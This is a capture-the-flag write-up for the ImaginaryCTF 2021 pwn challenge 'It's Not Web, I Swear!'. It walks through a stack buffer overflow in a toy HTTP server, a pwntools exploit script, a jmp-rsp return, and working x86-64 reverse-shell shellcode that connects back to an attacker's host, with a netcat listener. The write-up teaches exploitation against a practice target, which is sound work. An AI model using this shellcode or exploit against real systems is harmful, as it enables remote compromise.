# ImaginaryCTF 2021: It's Not Web, I Swear!

![date](https://img.shields.io/badge/date-27.07.2021-brightgreen.svg)  ![solved in time of CTF](https://img.shields.io/badge/solved-in%20time%20of%20CTF-brightgreen.svg) 
![pwn category](https://img.shields.io/badge/category-pwn-lightgrey.svg) ![score](https://img.shields.io/badge/score-450-blue.svg) ![solves](https://img.shields.io/badge/solves-17-brightgreen.svg)

## Description

In the spirit of DEFCON, I present you with this challenge that is not a web challenge! Go forth and pwn this notweb challenge

## Attached files
- [server](https://imaginaryctf.org/r/0AEB-server)

## Summary
To acquire the flag we had to find buffer overflow to override return pointer of a function to jump into our shellcode. However when our code is being executed we would already have been disconnected from the server, therefor we needed to reestablish the connection.

## Flag
``` ictf{all_pwn_and_no_web_makes_elliot_a_dull_boy} ```

## Detailed solution
After calling using **checksec** on challenge's binary we discover that there are no security features added by compiler, it even has executable stack
```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```
We can now look how the server works internally, in the **main** function, just after port passed as program argument gets verified, **startServer** is called. Then the program falls into **accept** loop. For each client connected to the server a new process is created to handle the communication.

In **respond** function firstly program checks if the request starts with ```GET /```
```
   0x4011b8 <respond+235>    mov    rsi, rdx
   0x4011bb <respond+238>    mov    rdi, rax
 ► 0x4011be <respond+241>    call   strstr@plt <strstr@plt>
        haystack: 0x604700 ◂— 'GET / HTTP/1.1\n'
        needle: 0x4017f8 ◂— 0x2f20544547 /* 'GET /' */
   0x4011c3 <respond+246>    cmp    qword ptr [rbp - 0x40], rax
   0x4011c7 <respond+250>    jne    respond+455 <respond+455>
```
our request has to pass that test in order to get to vulnerable path checking.

Then the program searches for ```<space>HTTP``` character sequence and number of characters between the end of ```GET /``` and the start of ```<space>HTTP``` is calculated. That number will be referred to as path length.

It is important to note that path length is stored as 32-bit variable
```
   0x401253 <respond+390>    sub    rdx, rax
   0x401256 <respond+393>    mov    rax, rdx
   0x401259 <respond+396>    mov    dword ptr [rbp - 0x54], eax
   0x40125c <respond+399>    mov    eax, dword ptr [rbp - 0x54]
```
Just after being calculated it is passed to **check_len** function, which returns **true** if length is below 100 and **false** if it is longer ... or ... wait!

```
   0x401067 <check_len+4>     mov    eax, edi
   0x401069 <check_len+6>     mov    byte ptr [rbp - 4], al
   0x40106c <check_len+9>     cmp    byte ptr [rbp - 4], 0x63
   0x401070 <check_len+13>    setbe  al
   0x401073 <check_len+16>    movzx  eax, al
```
it only checks if the least significant byte has value less than 100 ! They have even put it in another function to make it harder to spot!

When the function returns true, our path is copied onto the stack using full 32-bit path length. 
```
   0x40126d <respond+416>    mov    eax, dword ptr [rbp - 0x54]
   0x401270 <respond+419>    movsxd rdx, eax
   0x401273 <respond+422>    mov    rcx, qword ptr [rbp - 0x50]
   0x401277 <respond+426>    lea    rax, [rbp - 0xe0]
   0x40127e <respond+433>    mov    rsi, rcx
   0x401281 <respond+436>    mov    rdi, rax
   0x401284 <respond+439>    call   memcpy@plt <memcpy@plt>
```
There are ``0xe0`` bytes to get to the end of stack frame, then we have **main**'s function ``rbp`` which we can safely corrupt, and then there is return pointer.

However we have to check if there are any local variables that after getting corrupted would result in process crash. 
```
   0x401510 <respond+1091>    mov    rax, qword ptr [rbp - 0x40]
   0x401514 <respond+1095>    mov    rdi, rax
   0x401517 <respond+1098>    call   free@plt <free@plt>
```

There is only one such variable which is a pointer to the buffer that our message was **recv**'ed to. It is getting **free**'d just before return instruction, and never used elsewhere, so we can just zero it out.

We will create simple python script to help us sending data to the server
```
#!/bin/python

from pwn import *

import os

if len(sys.argv) > 1:
    io = remote('localhost', int(sys.argv[1]))
else:
    io = remote('not-web.chal.imaginaryctf.org', 42042)

padding_len = 0x100 - (240 & 0xff)

io.sendline(
        b'GET /' +
        b'A' * 160 +
        b'\x00\x00\x00\x00\x00\x00\x00\x00' +
        b'A' * 0x40 +
        b'BBBBBBBB' +
        b'D' * padding_len +
        b' HTTP'
)
```
We also need to add some padding to our path to make the lower bits of path length be 0

As expected the program crashes when trying to return to address ``0x4242...``
``` 
► 0x40158c <respond+1215>    ret    <0x4242424242424242>
```

Now we need to find address to return to, conveniently author of the challenge kindly left us useful ROP gadget at the end of **startServer** function
```
   0x40105e <startServer+375>    jmp    rsp
```
Stack pointer would now point right after the return pointer which in last example we have set to B's after modifying our script we can just put our shellcode there.
```
...
JMP_RSP = 0x40105e

os.system('nasm shellcode.asm')

shellcode = open('shellcode', 'rb').read()
payload_len = 240 + len(shellcode)
padding_len = 0x100 - (payload_len & 0xff)
...
        b'A' * 0x40 +
        p64(JMP_RSP) +
        shellcode +
        b'D' * padding_len +
...
```

Unfortunately at this point the server has already shut the connection with us down
```
   0x40152b <respond+1118>    mov    esi, 1
   0x401530 <respond+1123>    mov    edi, 1
   0x401535 <respond+1128>    call   shutdown@plt <shutdown@plt>
   0x40153a <respond+1133>    mov    edi, 1
   0x40153f <respond+1138>    call   close@plt <close@plt>
```
Therefor we have to reestablish connection to us in our shellcode:
```
[bits 64]
start:
	mov rax, 41		; socket
	mov rdi, 2		; AF_INET
	mov rsi, 1		; SOCK_STREAM
	xor rdx, rdx
	syscall

	mov r14, rax		; we need to save socket fd

	mov rdi, rax
	mov rax, 42		; connect
	lea rsi, [rel server]
	mov rdx, 16
	syscall

				; using dup2 syscalls we can redirect
				; all standard streams to our socket fd
	mov rax, 33		; dup2
	mov rdi, r14
	mov rsi, 0
	syscall
	
	mov rax, 33		; dup2
	mov rdi, r14
	mov rsi, 1
	syscall
	
	mov rax, 33		; dup2
	mov rdi, r14
	mov rsi, 2
	syscall

	mov rax, 59		; execve
	lea rdi, [rel sh]	; now we can execute bash
	lea rsi, [rel zero]
	lea rdx, [rel zero]
	syscall

zero:	dq 0
sh:	db "/bin/sh", 0
server:	db 0x02,0x00,0x05,0x39, 127,   0,   0,   1,0xa0,0x50,0x55,0x55,0x55,0x55,0x00,0x00
;                    PORT      IP ADDRESS
```

Note that port ( 1337 in this example ) needs to be in **big endian** order.
Now we can just start netcat server on specified port and check the result locally.
```
nc -lp 1337
```
After our shellcode gets executed we will have shell in our netcat window.
The only thing that is left to do is to put public ip into our code, make sure that the port is correctly forwarded, and send our exploit to challenge's server.
You can then use ls and cat to acquire the flag.
